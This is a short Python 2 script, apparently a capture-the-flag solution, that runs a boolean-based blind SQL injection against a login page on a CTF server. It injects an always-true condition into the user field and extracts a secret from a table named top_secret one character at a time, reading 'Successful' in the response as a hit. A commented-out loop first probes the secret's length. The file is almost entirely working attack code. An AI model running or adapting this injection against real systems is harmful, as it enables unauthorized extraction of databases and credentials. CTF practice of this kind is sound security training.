import urllib
import urllib2
import webbrowser
import requests
import string
 

# https://www.exploit-db.com/papers/13045/



payload = {'password': '', 'user' : 'hello'}

try_char_set = list(string.printable)

print(try_char_set)

# r = requests.post('http://csie.ctf.tw:10110/admin.php', params=payload )

length = 1
result = ''

# while 'Successful' not in result:
# 	payload['user'] = "hello' OR '1' = '1' and (select CHAR_LENGTH(value) from top_secret limit 0,1)=" + str(length) + " -- "
# 	# payload['user'] = "hello' OR '1' = '1' and (select LOWER(substring(value,1,1)) from top_secret limit 0,1)='f' -- "
# 	r = requests.post('http://csie.ctf.tw:10110/admin.php', data=payload )
# 	result = r.text
# 	print 'trial ' + str(length) + ' ... result = ' + result
# 	length += 1


flag = ''
for i in range(1, 41):
	for char in try_char_set:
		temp_flag = flag + char
		payload['user'] = "hello' OR '1' = '1' and (select substring(value,1," + str(i) + ") from top_secret limit 0,1)='" + temp_flag + "' -- "
		r = requests.post('http://csie.ctf.tw:10110/admin.php', data=payload )
		result = r.text

		if 'Successful' in result:
			flag = temp_flag
			break;
	print 'trial ' + str(i) + ' ... flag = ' + flag 




print flag

